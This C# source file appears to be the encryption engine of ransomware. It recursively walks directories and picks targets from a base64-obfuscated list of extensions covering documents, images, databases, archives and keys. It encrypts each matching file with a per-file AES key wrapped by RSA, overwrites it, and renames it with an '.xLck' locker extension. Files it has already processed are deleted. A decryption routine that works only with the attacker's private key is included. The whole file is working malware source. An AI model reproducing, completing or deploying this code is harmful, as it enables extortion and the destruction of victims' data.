using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

public class vxFileManager
{
    private vxCrypt encryption = null;
    private vxFunctions functions = new vxFunctions();
    private List<vxFileHeader> vxEncrypted = new List<vxFileHeader>();
    private const int MIN_FILE_SIZE = 330; //bytes
    private const string encryptedExt = "xLck";
    private const ushort VERSION = 0x2BB;
    private const string Exts = "dHh0fGRvY3xkb2N4fHhsc3x4bHN4fHBwdHxwcHR4fHNxbGl0ZXxvZHR8anBnfGpwZWd8Ym1wfGdpZnxwbmd8Y3N2fHNxbHxtZGJ8c2xufHBocHxhc3B8YXNweHxodG1sfGh0bXx4bWx8cHNkfHhzZHxjcHB8Y3xofGhwcHxweXxyZWd8cmJ8cGx8emlwfHJhcnx0Z3p8a2V5fGpzcHxkYnxzcWxpdGUzfHNxbGl0ZWRifGJhdHxiYWt8N3p8YXZpfGZsYXxmbHZ8amF2YXxtcGVnfHBlbXx3bXZ8dGFyfHRnenx0aWZmfHRpZg==";


    public vxFileManager()
    {
        encryption = new vxCrypt();
    }

    public vxFileManager(vxCrypt encryption)
    {
        this.encryption = encryption;
    }

    public int GetEncryptedCount()
    {
        return vxEncrypted.Count;
    }

    public void decryptDirectory(string location)
    {
        string[] files = Directory.GetFiles(location);
        string[] childDirectories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            string ext = Path.GetExtension(files[i]);

            if (ext.Contains("." + encryptedExt))
            {
                DecryptFile(files[i]);
            }
        }
        for (int i = 0; i < childDirectories.Length; i++)
        {
            decryptDirectory(childDirectories[i]);
        }
    }


    public void DecryptFile(string file)
    {
        byte[] EncryptedStruct = new byte[] { 0 };
        string cryptFile = file;

        vxFile _enc = new vxFile();
        vxFileHeader _header = new vxFileHeader();
        vxFunctions.CheckSums CHCKSM = new vxFunctions.CheckSums();
        RijndaelManaged AES = new RijndaelManaged();

        AES.KeySize = 256;
        AES.BlockSize = 128;
        AES.Mode = CipherMode.CBC;

        using (var x = File.OpenRead(file))
        {
            if (x.Length < MIN_FILE_SIZE) return;
        }

        vxFile FileToDec = ReadFileStruct(file);

        if (FileToDec == null) return;

        byte[] RSA_KEY = FileToDec.Header.RSA_KEY;
        byte[] AES_Decrypted = new byte[] { 0 };

        try
        {
            AES_Decrypted = encryption.RSA.Decrypt(RSA_KEY, true);
        }
        catch (CryptographicException)
        {
            return;
        }
        catch (Exception) { return; }

        byte[] AES_KEY = new byte[32];
        byte[] AES_IV = new byte[16];

        if (AES_Decrypted.Length < 48) return;

        try
        {
            Array.Copy(AES_Decrypted, 0, AES_KEY, 0, AES_KEY.Length);
            Array.Copy(AES_Decrypted, 32, AES_IV, 0, AES_IV.Length);
        }
        catch { }

        AES.Key = AES_KEY;
        AES.IV = AES_IV;

        byte[] DecryptedBytes = null;

        try
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(FileToDec.DATA, 0, FileToDec.DATA.Length);
                }
                DecryptedBytes = ms.ToArray();
            }
        }
        catch { }

        try
        {
            File.WriteAllBytes(file, DecryptedBytes);
        }
        catch (IOException){ }
        catch { }

        RemoveLockerExtension(file);
    }

    private void RemoveLockerExtension(string file)
    {
        try
        {
            File.Move(file, file.Replace(encryptedExt, ""));
        }
        catch { }
    }

    vxFile ReadFileStruct(string file)
    {
        vxFile myfile = new vxFile();
        vxFileHeader myhead = new vxFileHeader();

        try
        {
            using (var xvReader = new BinaryReader(File.OpenRead(file), Encoding.BigEndianUnicode))
            {
                myhead.Version = xvReader.ReadUInt16();
                myhead.Size = xvReader.ReadUInt64();
                myhead.RSA_KEY = xvReader.ReadBytes(256);
                myhead.CHECKSUM = xvReader.ReadBytes(64);
                myfile.Header = myhead;
                myfile.DATA = xvReader.ReadBytes((int)myhead.Size);
            }

            return myfile;
        }
        catch (IOException) { return null; }
        catch { return null; }
    }

    private void SetupAES(ref RijndaelManaged AES)
    {
        AES.KeySize = 256;
        AES.BlockSize = 128;
        AES.Mode = CipherMode.CBC;

        try
        {
            AES.IV = Encoding.ASCII.GetBytes(functions.GetRNGStr(16));
            AES.Key = Encoding.ASCII.GetBytes(functions.GetRNGStr(32));
        }
        catch { return; }
    }


    public void EncryptFile(string file)
    {
        byte[] EncryptedData = new byte[] { 0 };

        vxFile encFile = new vxFile();
        vxFileHeader header = new vxFileHeader();
        vxFunctions.CheckSums CHCKSM = new vxFunctions.CheckSums();
        RijndaelManaged AES = new RijndaelManaged();

        SetupAES(ref AES);

        int totalKeySize = (AES.KeySize / 8) + (AES.BlockSize / 8);

        byte[] Keys = new byte[totalKeySize];

        Array.Copy(AES.Key, 0, Keys, 0, 32);
        Array.Copy(AES.IV, 0, Keys, 32, 16);

        if (!File.Exists(file)) return;

        header.RSA_KEY = encryption.RSA.Encrypt(Keys, true);
        header.CHECKSUM = Encoding.ASCII.GetBytes(CHCKSM.SHA256CheckSum(file));
        header.Version = VERSION;

        if (IsFileEncrypted(Encoding.ASCII.GetString(header.CHECKSUM)))
        {
            try
            {
                File.Delete(file);
            }
            catch (Exception) { }
            return;
        }

        byte[] EncFile = ReadFile(file);
       

        encFile.Header = header;
        encFile.DATA = EncryptFileInMemory(EncFile, AES);

        byte[] FinalData = GetEncryptedFile(encFile);

        try
        {
            File.WriteAllBytes(file, FinalData);
            File.Move(file, string.Format("{0}.{1}", file, encryptedExt));
            vxEncrypted.Add(encFile.Header);
        }
        catch (IOException) { }
        catch (UnauthorizedAccessException) { }
        catch (Exception) {
        }
    }

    private byte[] ReadFile(string file)
    {
        byte[] FileData;

        try
        {
            FileData = File.ReadAllBytes(file);
        }
        catch (IOException) { return null; }
        catch (UnauthorizedAccessException) { return null; }
        catch (Exception) { return null; }

        return FileData;
    }

    private byte[] GetEncryptedFile(vxFile file)
    {
        try
        {
            long DataSize = file.DATA.Length;

            byte[] FullData;

            using (MemoryStream mem = new MemoryStream())
            {
                using (BinaryWriter writer = new BinaryWriter(mem, Encoding.BigEndianUnicode))
                {
                    writer.Write(BitConverter.GetBytes(VERSION), 0, 2);
                    writer.Write(BitConverter.GetBytes(DataSize), 0, sizeof(UInt64));
                    writer.Write(file.Header.RSA_KEY, 0, file.Header.RSA_KEY.Length);
                    writer.Write(file.Header.CHECKSUM, 0, file.Header.CHECKSUM.Length);
                    writer.Write(file.DATA, 0, file.DATA.Length);
                }

                FullData = mem.ToArray();
                mem.Close();

                return FullData;
            }
        }
        catch (IOException)
        {
            return null;
        }
        catch (Exception)
        {
            return null;
        }
    }

    private byte[] EncryptFileInMemory(byte[] FileData, RijndaelManaged AES)
    {
        byte[] EncryptedData;

        try
        {
            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(FileData, 0, FileData.Length);
                    cs.Close();
                }
                AES.Clear();
                EncryptedData = ms.ToArray();
            }
        }
        catch (IOException) { return null; }
        catch (CryptographicException){ return null; }
        catch (Exception) { return null; }


        return EncryptedData;
    }

    private string[] extractExts(string e) {
        try
        {
            string[] x = Encoding.ASCII.GetString(Convert.FromBase64String(e)).Split('|');

            for(int i = 0;i < x.Length; i++) x[i] = "." + x[i];

            return x;
        }
        catch { }

        return null;
    }


    public void encryptDirectory(string location)
    {
        string[] files = Directory.GetFiles(location);
        string[] childDirectories = Directory.GetDirectories(location);
        for (int i = 0; i < files.Length; i++)
        {
            string ext = Path.GetExtension(files[i]);

            string[] exts = extractExts(Exts);//LOAD extensions method

            if (exts.Contains(ext))
            {
                EncryptFile(files[i]);
            }
        }
        for (int i = 0; i < childDirectories.Length; i++)
        {
            encryptDirectory(childDirectories[i]);
        }
    }

    public bool IsFileEncrypted(string sha256)
    {
        foreach (vxFileHeader head in vxEncrypted)
        {
            string csum = Encoding.ASCII.GetString(head.CHECKSUM);
            if (csum == sha256) return true;
        }
        return false;
    }

    byte[] getBytes(vxFile str)
    {
        int size = Marshal.SizeOf(str);
        byte[] arr = new byte[size];

        IntPtr ptr = Marshal.AllocHGlobal(size);
        Marshal.StructureToPtr(str, ptr, true);
        Marshal.Copy(ptr, arr, 0, size);
        Marshal.FreeHGlobal(ptr);
        return arr;
    }
}

public class vxFile
{
    public vxFileHeader Header;
    public Byte[] DATA;
}


public class vxFileHeader
{
    public UInt16 Version;
    public UInt64 Size;
    public byte[] RSA_KEY;//2048-bit
    public byte[] CHECKSUM;//512-bit
}


